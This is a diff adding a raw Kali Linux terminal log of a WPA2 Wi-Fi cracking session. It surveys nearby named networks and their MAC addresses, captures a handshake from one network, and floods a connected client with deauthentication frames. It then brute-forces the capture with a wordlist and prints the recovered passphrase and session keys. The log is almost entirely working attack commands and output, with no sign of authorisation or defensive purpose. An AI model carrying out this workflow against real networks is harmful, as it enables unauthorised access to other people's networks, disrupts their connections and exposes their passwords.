@@ -1,0 +1,145 @@
+──(kali㉿kali)-[~]
+└─$ id kali         
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer)
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ sudo passwd root
+New password: 
+Retype new password: 
+passwd: password updated successfully
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ su root         
+Password: 
+su: Authentication failure
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ su root 
+Password: 
+┌──(root㉿kali)-[/home/kali]
+└─# ifconfig -a         
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 288  bytes 25464 (24.8 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 288  bytes 25464 (24.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0mon: flags=867<UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI>  mtu 1500
+        unspec 9C-FC-E8-8B-74-5F-00-43-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 27239  bytes 7840949 (7.4 MiB)
+        RX errors 0  dropped 12701  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                                                                                                                                                                                            
+┌──(root㉿kali)-[/home/kali]
+└─# airodump-ng wlan0mon 
+┌──(root㉿kali)-[/home/kali]
+└─# airodump-ng wlan0mon                                    
+
+
+
+
+
+ CH 11 ][ Elapsed: 6 s ][ 2022-04-12 16:27                                                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                            
+                                                                                                                                                                                                                                            
+ D8:07:B6:CD:5A:0B  -81        2        0    0  10  360   WPA2 CCMP   PSK  joseph-tp-link                                                                                                                                                   
+ AA:48:B8:67:A7:29  -75        4        0    0   4  130   WPA2 CCMP   PSK  <length: 30>                                                                                                                                                     
+ AA:65:2B:1F:3E:43  -35        7        0    0   6  180   WPA2 CCMP   PSK  No_Wi-Fi_KuKu_O                                                                                                                                                  
+ 5C:92:5E:AD:FC:EC  -46       12        0    0   8  270   WPA2 CCMP   PSK  qekain                                                                                                                                                           
+ 40:4A:03:2B:6F:17  -57        4        0    0  11   54e  WPA  TKIP   PSK  qekain                                                                                                                                                           
+ 40:9B:CD:97:EF:8E  -61        4       14    6  11  270   WPA2 CCMP   PSK  liao88                                                                                                                                                           
+ D4:5D:64:2F:D5:B8  -60        6        1    0   8  195   WPA2 CCMP   PSK  Wen_2.4G                                                                                                                                                         
+ 64:09:80:59:66:F6  -66        4        0    0   1  130   WPA2 CCMP   PSK  liao88                                                                                                                                                           
+ 14:09:DC:B1:F7:30  -68        4        0    0   1  130   WPA2 CCMP   PSK  20N3F                                                                                                                                                            
+ 92:53:C3:D8:B0:B4  -69        2        0    0  11  360   OPN              <length:  0>                                                                                                                                                     
+ E8:48:B8:67:A7:27  -74        4        0    0   4  130   WPA2 CCMP   PSK  TP-Link_A728                                                                                                                                                     
+ AC:84:C6:71:F7:0C  -72        3        0    0   5  195   WPA2 CCMP   PSK  Joestar                                                                                                                                                          
+ D8:FE:E3:5F:69:FF  -74        3        0    0  11  130   WPA2 CCMP   PSK  295Y221504                                                                                                                                                       
+ AA:48:B8:67:A7:2A  -75        3        0    0   4  130   OPN              TP-Link_Guest_A728                                                                                                                                               
+ 58:87:E2:F7:70:F0  -75        4        0    0   1   65   WPA2 CCMP   PSK  DCTV18-1_2GH1MB2                                                                                                                                                 
+ E4:35:C8:20:FD:B4  -76        5        0    0   1  130   WPA2 CCMP   PSK  20N4F                                                                                                                                                            
+ 8C:BE:BE:2F:ED:A6  -80        3        0    0   9  130   WPA2 CCMP   PSK  Xiaomi_EDA5                                                                                                                                                      
+ 68:02:B8:1C:62:8F  -83        2        0    0   6  540   WPA2 CCMP   PSK  20N5F-2.4G                                                                                                                                                       
+ 0C:9D:92:59:A4:04  -83        4        0    0   9  195   WPA2 CCMP   PSK  CC                                                                                                                                                               
+ 5C:F4:AB:A2:CF:B4  -84        2        1    0   1  130   WPA2 CCMP   PSK  JANE                                                                                                                                                             
+ F8:98:B9:E4:B8:30  -85        2        0    0  11   65   WPA2 CCMP   PSK  17N4F                                                                                                                                                            
+                                                                                                                                                                                                                                            
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                                                                                                                          
+                                                                                                                                                                                                                                            
+ 5C:92:5E:AD:FC:EC  C6:0C:6C:DF:25:ED  -79    0 - 1e     1        4                                                                                                                                                                         
+ 40:9B:CD:97:EF:8E  CE:E4:95:72:DB:8D  -65   24e-24    398       19                                                                                                                                                                         
+Quitting...    
+┌──(root㉿kali)-[/home/kali]
+└─# airodump-ng -c 6 -w No_Wi-Fi_KuKu_O --bssid AA:65:2B:1F:3E:43 wlan0mon
+16:36:42  Created capture file "No_Wi-Fi_KuKu_O-03.cap".
+
+
+
+ CH  6 ][ Elapsed: 8 mins ][ 2022-04-12 16:45 ][ WPA handshake: AA:65:2B:1F:3
+                                                                             
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUT
+                                                                             
+ AA:65:2B:1F:3E:43  -26 100     4745     1313    0   6  180   WPA2 CCMP   PSK
+                                                                             
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  P
+                                                                             
+ AA:65:2B:1F:3E:43  7A:F1:10:02:7E:CF  -25    1e- 1   1263     1758  EAPOL  N
+Quitting...                                                                  
+                                                                             
+┌──(root㉿kali)-[/home/kali]
+└─# aireplay-ng -0 0 -a AA:65:2B:1F:3E:43 -c 7A:F1:10:02:7E:CF wlan0mon   
+16:51:15  Waiting for beacon frame (BSSID: AA:65:2B:1F:3E:43) on channel 6
+16:51:15  Sending 64 directed DeAuth (code 7). STMAC: [7A:F1:10:02:7E:CF] [38
+16:51:16  Sending 64 directed DeAuth (code 7). STMAC: [7A:F1:10:02:7E:CF] [ 0
+16:51:26  Sending 64 directed DeAuth (code 7). STMAC: [7A:F1:10:02:7E:CF] [ 5
+16:51:30  Sending 64 directed DeAuth (code 7). STMAC: [7A:F1:10:02:7E:^C] [ 2                                                                                                                                                       
+                                                                      
+                                                                                                                                                                                                                                           
+┌──(root㉿kali)-[/home/kali]
+└─# aircrack-ng -w /media/kali/Hi/dict/rockyou.txt No_Wi-Fi_KuKu_O-03.cap
+Reading packets, please wait...
+Opening No_Wi-Fi_KuKu_O-03.cap
+Read 19433 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  AA:65:2B:1F:3E:43  No_Wi-Fi_KuKu_O           WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening No_Wi-Fi_KuKu_O-03.cap
+Read 19433 packets.
+
+1 potential targets
+
+
+                               Aircrack-ng 1.6 
+
+      [00:00:00] 326/10303727 keys tested (4080.62 k/s) 
+
+      Time left: 42 minutes, 4 seconds                           0.00%
+
+                           KEY FOUND! [ 88888888 ]
+
+
+      Master Key     : F4 52 1A C4 2D 71 2C 68 82 4A E1 0D BB 48 E7 0F 
+                       0B 29 D4 1F 04 93 AA 14 24 62 85 35 77 3D BC 8F 
+
+      Transient Key  : A5 31 85 78 58 41 8E 2A DF 72 71 50 E8 28 1C C6 
+                       F8 95 2E 11 92 D7 3F 7B C2 C1 CC 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 7E A5 87 FF 19 91 A8 FA 35 04 F1 AF EE 0D C0 05 
+
+
+                                                                                                                                                                                                                                            
+┌──(root㉿kali)-[/home/kali]
+└─#
